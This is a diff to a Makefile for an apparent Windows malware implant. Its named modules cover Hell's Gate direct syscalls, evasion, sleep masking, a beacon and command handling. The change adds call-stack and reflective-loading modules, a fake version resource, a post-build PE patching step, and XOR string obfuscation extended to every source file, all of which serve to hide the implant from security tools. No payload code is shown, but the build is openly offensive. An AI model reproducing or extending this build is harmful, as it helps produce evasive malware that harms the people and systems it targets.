@@ -8,29 +8,36 @@
 
 CC      := x86_64-w64-mingw32-gcc
 NASM    := nasm
+WINDRES := x86_64-w64-mingw32-windres
 PYTHON  := python3
 
 SRCDIR  := src
 ASMDIR  := asm
 INCDIR  := include
+RESDIR  := resource
 OUTDIR  := build
 TOOLDIR := tools
 
 SRCS := $(SRCDIR)/entry.c      \
         $(SRCDIR)/hellsgate.c   \
         $(SRCDIR)/syscalls.c    \
+        $(SRCDIR)/callstack.c   \
         $(SRCDIR)/crypto.c      \
         $(SRCDIR)/utils.c       \
         $(SRCDIR)/evasion.c     \
         $(SRCDIR)/sleep_mask.c  \
         $(SRCDIR)/beacon.c      \
         $(SRCDIR)/commands.c    \
+        $(SRCDIR)/reflect.c     \
         $(SRCDIR)/obf_table.c
 
 ASM_SRC := $(ASMDIR)/syscall_stub.asm
 ASM_OBJ := $(OUTDIR)/syscall_stub.o
 
-OBJS := $(patsubst $(SRCDIR)/%.c, $(OUTDIR)/%.o, $(SRCS)) $(ASM_OBJ)
+RC_SRC  := $(RESDIR)/version.rc
+RC_OBJ  := $(OUTDIR)/version.o
+
+OBJS := $(patsubst $(SRCDIR)/%.c, $(OUTDIR)/%.o, $(SRCS)) $(ASM_OBJ) $(RC_OBJ)
 
 # ── Per-build XOR key ──────────────────────────────────────────────────────
 # Generate a random key unless OBF_KEY is set by the caller (generator_c.go
@@ -70,6 +77,7 @@ NASMFLAGS := -f win64
 .PHONY: all clean obfuscate info
 
 all: $(OUTDIR) obfuscate $(TARGET)
+	$(PYTHON) $(TOOLDIR)/pe_patch.py $(TARGET)
 
 $(OUTDIR):
 	mkdir -p $(OUTDIR)
@@ -78,7 +86,9 @@ $(OUTDIR):
 obfuscate: $(SRCDIR)/obf_table.c
 
 $(SRCDIR)/obf_table.c: $(TOOLDIR)/gen_obf.py $(SRCDIR)/hellsgate.c $(SRCDIR)/beacon.c \
-                        $(SRCDIR)/evasion.c $(SRCDIR)/commands.c $(SRCDIR)/sleep_mask.c
+                        $(SRCDIR)/evasion.c $(SRCDIR)/commands.c $(SRCDIR)/sleep_mask.c \
+                        $(SRCDIR)/callstack.c $(SRCDIR)/syscalls.c $(SRCDIR)/crypto.c \
+                        $(SRCDIR)/utils.c $(SRCDIR)/entry.c $(SRCDIR)/reflect.c
 	$(PYTHON) $(TOOLDIR)/gen_obf.py . $(OBF_KEY)
 
 # Compile C sources (obf_table.c depends on obfuscate target above)
@@ -89,13 +99,17 @@ $(OUTDIR)/%.o: $(SRCDIR)/%.c $(INCDIR)/implant.h $(INCDIR)/ntdefs.h $(INCDIR)/co
 $(ASM_OBJ): $(ASM_SRC)
 	$(NASM) $(NASMFLAGS) $< -o $@
 
+# Compile version resource
+$(RC_OBJ): $(RC_SRC)
+	$(WINDRES) $(RC_SRC) -O coff -o $@
+
 # Link
 $(TARGET): $(OBJS)
 	$(CC) $(OBJS) -o $@ $(LDFLAGS) \
 	    -lkernel32 -lntdll -lpsapi
 
 clean:
-	rm -rf $(OUTDIR) $(SRCDIR)/obf_table.c
+	rm -rf $(OUTDIR) $(SRCDIR)/obf_table.c $(RESDIR)/version.rc
 
 .PHONY: info
 info: $(TARGET)
